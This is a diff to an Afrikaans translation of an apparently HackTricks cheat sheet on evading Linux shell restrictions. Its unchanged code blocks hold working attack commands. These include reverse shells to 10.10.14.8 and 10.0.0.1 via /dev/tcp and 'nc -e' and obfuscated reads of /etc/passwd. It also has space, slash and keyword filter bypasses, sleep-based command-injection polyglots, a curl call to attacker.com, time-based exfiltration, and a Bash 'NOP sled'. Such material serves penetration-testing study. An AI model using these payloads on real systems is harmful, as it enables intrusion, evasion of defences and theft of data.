@@ -1,8 +1,8 @@
-# Omseiling van Linux-beperkings
+# Omseil Linux-beperkings
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Omseilings van algemene beperkings
+## Algemene omseilings van beperkings
 
 ### Reverse Shell
 ```bash
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Bypass-paaie en verbode woorde
+### Bypass Paths en verbode woorde
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -78,7 +78,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Omseil verbode spasies
+### Bypass verbode spasies
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -105,16 +105,16 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Omseil terugskuinsstreep en skuinsstreep
+### Omseil backslash en slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Omseil pipes
+### Omseil pype
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Omseil met hex-enkodering
+### Bypass met hex-enkodering
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -124,28 +124,28 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Omseil IP's
+### Omseil IP-adresse
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Tydgebaseerde data-eksfiltrasie
+### Tydgebaseerde data-exfiltrasie
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Kry karakters uit omgewingsveranderlikes
+### Karakters uit Env Variables verkry
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNS data exfiltration
+### DNS-data-exfiltrasie
 
-You could use **burpcollab** or [**pingb**](http://pingb.in) for example.
+Jy kan byvoorbeeld **burpcollab** of [**pingb**](http://pingb.in) gebruik.
 
 ### Builtins
 
-In geval jy nie eksterne funksies kan uitvoer nie en slegs toegang het tot ’n **beperkte stel Builtins om RCE te verkry**, is daar ’n paar handige truuks om dit te doen. Gewoonlik **sal jy nie al** die **Builtins** kan gebruik nie, dus moet jy **al jou opsies ken** om die jail te probeer omseil. Idee van [**devploit**](https://twitter.com/devploit).\
-Gaan eerstens al die [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** na.** Hier is dan ’n paar **aanbevelings**:
+Indien jy nie eksterne funksies kan uitvoer nie en slegs toegang tot ’n **beperkte stel builtins het om RCE te verkry**, is daar ’n paar handige truuks om dit te doen. Gewoonlik sal jy **nie al** die **builtins kan gebruik nie**, dus moet jy **al jou opsies ken** om die jail te probeer omseil. Idee van [**devploit**](https://twitter.com/devploit).\
+Kyk eerstens na al die [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Hier is vervolgens ’n paar **aanbevelings**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Bypass potensiële regexes
+### Omseil moontlike regexes
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -298,13 +298,11 @@ ln /f*
 
 As jy binne ’n lêerstelsel met die **read-only- en noexec-beskerming** is, of selfs in ’n distroless container, is daar steeds maniere om **arbitrêre binaries, selfs ’n shell, uit te voer!:**
 
-
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
 ## Chroot & other Jails Bypass
-
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
@@ -312,31 +310,30 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Wanneer ’n kwesbaarheid jou gedeeltelike beheer gee oor ’n argument wat uiteindelik `system()` of ’n ander shell bereik, weet jy moontlik nie die presiese offset waar die uitvoering jou payload begin lees nie. Tradisionele NOP sleds (bv. `\x90`) werk **nie** in shell-sintaksis nie, maar Bash sal voorloopende witruimte onskadelik ignoreer voordat dit ’n bevel uitvoer.
+Wanneer ’n kwesbaarheid jou toelaat om ’n argument gedeeltelik te beheer wat uiteindelik `system()` of ’n ander shell bereik, weet jy dalk nie die presiese offset waar uitvoering jou payload begin lees nie. Tradisionele NOP sleds (bv. `\x90`) werk **nie** in shell-sintaksis nie, maar Bash sal voorste whitespace onskadelik ignoreer voordat dit ’n command uitvoer.
 
-Daarom kan jy ’n *NOP sled for Bash* skep deur jou werklike bevel met ’n lang reeks spasies of tab-karakters vooraf te gaan:
+Daarom kan jy ’n *NOP sled vir Bash* skep deur jou werklike command vooraf te gaan met ’n lang reeks spasies of tab-karakters:<sup>[[5]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-As ’n ROP-ketting (of enige memory-corruption primitive) die instruction pointer enige plek binne die space block laat land, slaan die Bash-parser eenvoudig die whitespace oor totdat dit `nc` bereik, en voer jou command betroubaar uit.
+As 'n ROP chain (of enige memory-corruption primitive) die die instruction pointer enige plek binne die spasieblok laat beland, slaan die Bash-parser eenvoudig die whitespace oor totdat dit `nc` bereik, en voer jou command betroubaar uit.
 
 Praktiese gebruiksgevalle:
 
 1. **Memory-mapped configuration blobs** (bv. NVRAM) wat oor prosesse heen toeganklik is.
-2. Situasies waar die attacker nie NULL-bytes kan skryf om die payload in lyn te bring nie.
-3. Ingebedde toestelle waar slegs BusyBox `ash`/`sh` beskikbaar is – hulle ignoreer ook vooraanstaande spasies.
+2. Situasies waar die attacker nie NULL bytes kan skryf om die payload te belyn nie.
+3. Embedded devices waar slegs BusyBox `ash`/`sh` beskikbaar is – hulle ignoreer ook voorste spasies.
 
-> 🛠️  Kombineer hierdie truuk met ROP-gadgets wat `system()` aanroep om exploit-betroubaarheid op IoT-routers met beperkte geheue dramaties te verhoog.
+> 🛠️  Kombineer hierdie truuk met ROP gadgets wat `system()` oproep om exploit-betroubaarheid dramaties te verhoog op memory-constrained IoT routers.
 
-## Verwysings & Meer
+## Verwysings
 
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
-
-- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../../banners/hacktricks-training.md}}
